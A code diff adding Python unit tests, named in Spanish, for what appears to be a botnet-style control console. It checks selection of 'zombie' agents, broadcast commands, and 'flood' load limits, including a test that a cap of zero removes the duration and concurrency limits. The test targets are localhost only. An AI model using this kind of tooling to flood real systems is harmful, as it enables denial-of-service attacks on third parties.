@@ -31,6 +31,7 @@ def make_config(**overrides) -> Config:
 class FakeAgent:
     def __init__(self, agent_id: str = "zombie-01") -> None:
         self.agent_id = agent_id
+        self.hostname = "PC-FAKE"
         self.requests: list[tuple[str, dict, float]] = []
 
     async def request(self, name: str, args: dict | None = None, timeout: float = 10.0) -> dict:
@@ -42,6 +43,12 @@ class FakeManager:
     def __init__(self, agents: list[FakeAgent]) -> None:
         self.agents = agents
         self.calls: list[tuple[str, dict, float]] = []
+
+    def find(self, reference: str):
+        for index, agent in enumerate(self.agents):
+            if str(index) == reference or agent.agent_id == reference:
+                return agent
+        return None
 
     async def broadcast(self, name: str, args: dict | None = None, timeout: float = 10.0):
         payload = args or {}
@@ -159,6 +166,49 @@ class BroadcastLoadContractTests(unittest.IsolatedAsyncioTestCase):
         self.assertEqual(after["summary"]["sent"], 0)
 
 
+class SelectAllTests(unittest.IsolatedAsyncioTestCase):
+    async def test_select_all_apunta_a_todos(self):
+        console = make_console([FakeAgent("zombie-01"), FakeAgent("zombie-02")])
+        console.selected = console.manager.agents[0]
+        with redirect_stdout(io.StringIO()):
+            console._cmd_select(["all"])
+        self.assertIsNone(console.selected)
+        self.assertTrue(console.all_selected)
+
+    async def test_select_individual_quita_el_modo_todos(self):
+        agents = [FakeAgent("zombie-01"), FakeAgent("zombie-02")]
+        console = make_console(agents)
+        with redirect_stdout(io.StringIO()):
+            console._cmd_select(["all"])
+            console._cmd_select(["1"])
+        self.assertIs(console.selected, agents[1])
+        self.assertFalse(console.all_selected)
+
+    async def test_send_con_todos_hace_broadcast(self):
+        agents = [FakeAgent("zombie-01"), FakeAgent("zombie-02")]
+        console = make_console(agents)
+        with redirect_stdout(io.StringIO()):
+            console._cmd_select(["all"])
+            await console._cmd_send(["ping"])
+        self.assertEqual(console.manager.calls[0][0], "ping")
+
+    async def test_unselect_quita_el_modo_todos(self):
+        console = make_console([FakeAgent()])
+        with redirect_stdout(io.StringIO()):
+            console._cmd_select(["all"])
+            await console._dispatch("unselect", [])
+        self.assertFalse(console.all_selected)
+        self.assertIsNone(console.selected)
+
+    async def test_ping_con_todos_hace_broadcast(self):
+        agents = [FakeAgent("zombie-01"), FakeAgent("zombie-02")]
+        console = make_console(agents)
+        with redirect_stdout(io.StringIO()):
+            console._cmd_select(["all"])
+            await console._cmd_ping([])
+        self.assertEqual(console.manager.calls[0][0], "ping")
+
+
 class NormalizeLoadTests(unittest.TestCase):
     def test_recorta_duration_y_concurrency(self):
         result = normalize_load_args(
@@ -167,6 +217,22 @@ class NormalizeLoadTests(unittest.TestCase):
         )
         self.assertEqual(result["duration"], MAX_DURATION_S)
         self.assertEqual(result["concurrency"], MAX_CONCURRENCY)
+
+    def test_topes_configurables_remplazan_los_defecto(self):
+        result = normalize_load_args(
+            {"target": "http://127.0.0.1:8080", "duration": "999", "concurrency": "999"},
+            make_config(flood_max_duration=300, flood_max_concurrency=500),
+        )
+        self.assertEqual(result["duration"], 300)
+        self.assertEqual(result["concurrency"], 500)
+
+    def test_tope_en_cero_quita_el_limite(self):
+        result = normalize_load_args(
+            {"target": "http://127.0.0.1:8080", "duration": "999", "concurrency": "999"},
+            make_config(flood_max_duration=0, flood_max_concurrency=0),
+        )
+        self.assertEqual(result["duration"], 999)
+        self.assertEqual(result["concurrency"], 999)
 
     def test_rechaza_cero_y_negativos(self):
         with self.assertRaises(ValueError):
